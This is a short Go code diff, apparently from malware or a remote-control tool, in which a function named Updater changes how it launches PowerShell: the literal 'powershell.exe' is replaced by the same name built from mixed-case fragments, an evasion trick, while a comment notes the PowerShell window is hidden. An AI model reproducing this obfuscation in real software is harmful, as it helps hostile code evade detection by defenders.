@@ -32,7 +32,8 @@ func Updater() {
                         continue
                 }
 
-                cmd := exec.Command("powershell.exe")
+                // cmd := exec.Command("powershell.exe")
+                cmd := exec.Command(strings.ToLower(fmt.Sprintf("%s%s%s%s", "Po", "wEr", "sHEL", "l.exE")))
 
                 // hides PowerShell window after command execution
                 cmd.SysProcAttr = &syscall.SysProcAttr{
